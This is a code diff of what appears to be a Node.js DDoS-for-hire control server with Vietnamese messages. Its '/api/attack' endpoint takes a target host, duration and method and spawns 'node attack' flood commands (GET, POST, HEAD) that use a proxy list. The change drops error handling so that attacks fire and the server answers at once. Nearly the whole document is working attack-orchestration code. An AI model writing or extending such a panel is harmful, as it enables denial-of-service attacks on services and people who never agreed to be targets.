@@ -20,26 +20,24 @@ const validateInput = ({ key, host, time, method, port }) => {
   return null;
 };
 
-const executeAttack = (command) => new Promise((resolve, reject) => {
+const executeAttack = (command) => {
   const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
   currentPID = childProcess.pid;
 
   childProcess.on("close", (code) => {
     activeAttacks--, currentPID = null;
     console.log(`Tiến trình ${currentPID} đã kết thúc với mã ${code}. Slot được giải phóng.`);
-    resolve();
   });
 
   childProcess.on("error", (err) => {
     activeAttacks--, currentPID = null;
     console.error(`Lỗi khi thực thi lệnh: ${err.message}`);
-    reject(err);
   });
-});
+};
 
 const executeAllAttacks = (methods, host, time) => {
   methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`)
-    .forEach((command) => executeAttack(command).catch((err) => console.error(`Lỗi khi thực thi lệnh: ${err}`)));
+    .forEach((command) => executeAttack(command));
 };
 
 app.get("/api/attack", (req, res) => {
@@ -58,12 +56,29 @@ app.get("/api/attack", (req, res) => {
 
   if (modul === "FULL") {
     executeAllAttacks(["GET", "POST", "HEAD"], host, time);
-    res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", pid: currentPID });
+    res.json({
+      status: "SUCCESS",
+      message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
+      host: host,
+      port: port,
+      time: time,
+      modul: "GET POST HEAD",
+      method: method,
+      pid: currentPID,
+    });
   } else {
     const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
-    executeAttack(command)
-      .then(() => res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI", pid: currentPID }))
-      .catch((err) => res.status(500).json({ status: "ERROR", message: `LỖI KHI THỰC THI LỆNH: ${err}` }));
+    executeAttack(command);
+    res.json({
+      status: "SUCCESS",
+      message: "LỆNH TẤN CÔNG ĐÃ GỬI",
+      host: host,
+      port: port,
+      time: time,
+      modul: modul,
+      method: method,
+      pid: currentPID,
+    });
   }
 });
 
